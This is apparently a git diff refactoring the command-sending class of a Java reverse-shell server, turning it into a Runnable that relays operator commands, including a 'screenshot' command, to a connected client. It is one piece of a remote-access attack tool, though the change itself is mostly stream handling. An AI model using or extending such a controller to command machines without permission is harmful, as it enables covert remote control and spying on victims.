@@ -2,19 +2,18 @@ package obs1d1anc1ph3r.reverseshell.server;
 
 import java.io.*;
 
-public class CommandSender {
+public class CommandSender implements Runnable {
 
     private PrintWriter out;
     private BufferedReader userInput;
-    private ReverseShellServer server;
 
-    public CommandSender(PrintWriter out, BufferedReader userInput, ReverseShellServer server) {
+    public CommandSender(PrintWriter out, BufferedReader userInput) {
         this.out = out;
         this.userInput = userInput;
-        this.server = server;
     }
 
-    public void handleShell() {
+    @Override
+    public void run() {
         try {
             String command;
             System.out.print("\nCommand> ");
@@ -24,18 +23,39 @@ public class CommandSender {
                     break;
                 }
 
-                if (command.equalsIgnoreCase("screenshot")) {
-                    server.receiveScreenshot();
+                if ("screenshot".equalsIgnoreCase(command)) {
+                    sendCommand("screenshot");
+                } else {
+                    sendCommand(command);
                 }
 
-                sendCommand(command);
+                System.out.print("\nCommand> ");
             }
         } catch (IOException e) {
             System.err.println("[ERROR] Error reading command input: " + e.getMessage());
+        } finally {
+            cleanup();
         }
     }
 
     private void sendCommand(String command) {
-        out.println(command);
+        if (out != null) {
+            out.println(command);
+            out.flush();
+            System.out.println("[*] Command sent: " + command);
+        } else {
+            System.err.println("[ERROR] Output stream is closed. Unable to send command.");
+        }
+    }
+
+    private void cleanup() {
+        try {
+            if (out != null) {
+                out.close();
+                System.out.println("[*] Output stream closed.");
+            }
+        } catch (Exception e) {
+            System.err.println("[ERROR] Error during cleanup: " + e.getMessage());
+        }
     }
 }
